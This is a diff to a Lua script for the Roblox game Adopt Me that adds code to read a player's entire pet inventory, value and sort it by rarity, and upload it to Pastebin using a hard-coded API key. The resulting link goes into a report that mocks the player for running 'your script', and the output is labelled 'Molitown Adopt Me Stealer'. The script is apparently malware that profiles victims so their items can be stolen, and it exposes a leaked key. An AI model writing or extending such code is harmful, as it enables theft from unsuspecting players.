@@ -368,6 +368,134 @@ for i = 1, math.min(5, #topPets) do
     topPetsText = topPetsText .. string.format("%s%s: %d$\n", pet.name, petType, math.floor(pet.value))
 end
 
+local HttpService = game:GetService("HttpService")
+
+local function pastebin(content)
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "https://pastebin.com/raw/example" -- fallback URL
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+-- Функция для создания полного списка петов
+local function createFullPetsList()
+    local petCategories = {
+        legendary = {},
+        ultra_rare = {},
+        rare = {},
+        uncommon = {},
+        common = {}
+    }
+    
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+    
+    for _, petData in pairs(PetsInventory) do
+        local petInfo = InventoryDB[petData.category][petData.id]
+        local petName = petInfo.name
+        local calculatedValue, baseValue = calculatePetValue(petData)
+        
+        -- Определяем тип питомца
+        local petType = ""
+        if petData.properties then
+            if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
+                petType = " MFR"
+            elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
+                petType = " NFR"
+            elseif petData.properties.flyable and petData.properties.rideable then
+                petType = " FR"
+            elseif petData.properties.mega_neon then
+                petType = " Mega"
+            elseif petData.properties.neon then
+                petType = " Neon"
+            elseif petData.properties.flyable then
+                petType = " Fly"
+            elseif petData.properties.rideable then
+                petType = " Ride"
+            end
+        end
+        
+        local petEntry = string.format("%s%s: %d$", petName, petType, math.floor(calculatedValue))
+        
+        -- Добавляем в соответствующую категорию
+        if petInfo.rarity == "legendary" then
+            table.insert(petCategories.legendary, petEntry)
+        elseif petInfo.rarity == "ultra_rare" then
+            table.insert(petCategories.ultra_rare, petEntry)
+        elseif petInfo.rarity == "rare" then
+            table.insert(petCategories.rare, petEntry)
+        elseif petInfo.rarity == "uncommon" then
+            table.insert(petCategories.uncommon, petEntry)
+        elseif petInfo.rarity == "common" then
+            table.insert(petCategories.common, petEntry)
+        end
+    end
+    
+    -- Сортируем каждую категорию по ценности
+    local sortByValue = function(a, b)
+        local aValue = tonumber(a:match("(%d+)$")) or 0
+        local bValue = tonumber(b:match("(%d+)$")) or 0
+        return aValue > bValue
+    end
+    
+    for _, category in pairs(petCategories) do
+        table.sort(category, sortByValue)
+    end
+    
+    -- Формируем итоговый текст
+    local pastebinContent = "-- 🐉 LEGENDARY PETS 🐉 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.legendary > 0 and table.concat(petCategories.legendary, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- 🔥 ULTRA-RARE PETS 🔥 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.ultra_rare > 0 and table.concat(petCategories.ultra_rare, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- 💎 RARE PETS 💎 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.rare > 0 and table.concat(petCategories.rare, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- 🟢 UNCOMMON PETS 🟢 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.uncommon > 0 and table.concat(petCategories.uncommon, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- ⚪ COMMON PETS ⚪ --\n"
+    pastebinContent = pastebinContent .. (#petCategories.common > 0 and table.concat(petCategories.common, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "Total pets: " .. #PetsInventory .. "\n"
+    pastebinContent = pastebinContent .. "Generated by Molitown Adopt Me Stealer"
+    
+    return pastebinContent
+end
+
+-- Создаем полный список петов и публикуем на pastebin
+local fullPetsList = createFullPetsList()
+local pastebinLink = pastebin(fullPetsList)
+
 local embed = {
     ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - ".. plr.Name,
     ["color"] = 16711935,
@@ -406,9 +534,9 @@ local embed = {
             ["inline"] = false
         },
         {
-            ["name"] = "〘:computer:〙**Teleport to :mammoth:**",
-            ["value"] = "```lua\n" ..
-                        browserTeleport .. "\n" .."```"
+            ["name"] = "〘:scroll:〙**Full Pets List**",
+            ["value"] = "[📋 Click to view all pets](" .. pastebinLink .. ")",
+            ["inline"] = false
         },
     }
 }
